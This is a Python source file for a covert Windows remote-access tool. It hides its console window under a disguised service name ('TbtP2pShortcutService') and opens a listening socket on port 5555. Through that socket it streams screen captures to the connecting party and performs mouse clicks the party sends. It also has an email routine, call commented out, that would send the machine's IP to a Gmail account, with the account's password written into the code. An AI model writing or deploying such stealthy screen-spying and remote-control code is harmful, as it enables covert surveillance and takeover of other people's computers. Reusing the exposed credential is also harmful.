from PIL import ImageGrab
import socket
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
import smtplib
import win32con
import win32gui
from os import system
import pyautogui


system("title TbtP2pShortcutService")

def mouseclick(s):
    a = str(s)
    c=a.split("-")
    xx=c[0]
    yy=c[1]
    if int(xx)>1920:
        return
    if int(yy)>1080:
        return
    pyautogui.click(int(xx), int(yy), clicks=2)

def hideWindows():
    yy= win32gui.FindWindow(None,"TbtP2pShortcutService")
    win32gui.ShowWindow(yy, win32con.SW_HIDE)

def getTime():
    return str(datetime.now())

def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    IP=str(s.getsockname()[0])
    s.close()
    return IP

def sendEmail():
    content = MIMEMultipart()  #建立MIMEMultipart物件
    content["subject"] = getTime()  #郵件標題
    content["from"] = 'hyprocrite1631@gmail.com'  #寄件者
    content["to"] = 'hyprocrite1631@gmail.com' #收件者
    content.attach(MIMEText(getIP()))  #郵件內容

    with smtplib.SMTP(host="smtp.gmail.com", port="587") as smtp:  # 設定SMTP伺服器
        try:
            smtp.ehlo()  # 驗證SMTP伺服器
            smtp.starttls()  # 建立加密傳輸
            smtp.login("hyprocrite1631@gmail.com", "deriizdwazknoanu")  # 登入寄件者gmail
            smtp.send_message(content)  # 寄送郵件
        except Exception as e:
            print("check....")

def socket0():
    #sendEmail()
    host = str(getIP())  # 對server端為主機位置
    port = 5555
    address = (host, port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(address)  # 讓這個socket要綁到位址(ip/port)
        s.listen(10)  
    except:
        exit()
    while True:
        c, addr = s.accept()
        size=len(ImageGrab.grab().tobytes())
        c.send(bytes(str(size),'utf-8'))
        while True:
            try:
                aa=c.recv(1024)
                bb=aa.decode()
                mm = bb.replace("g","")
                if mm != "":
                    mouseclick(mm)

                img_rgb = ImageGrab.grab(bbox=(0, 0, 1920, 1080))
                data = img_rgb.tobytes()
                c.send(data)
            except Exception:
                s.close()
                c.close()
                socket0()


if __name__=='__main__':
    hideWindows()
    socket0()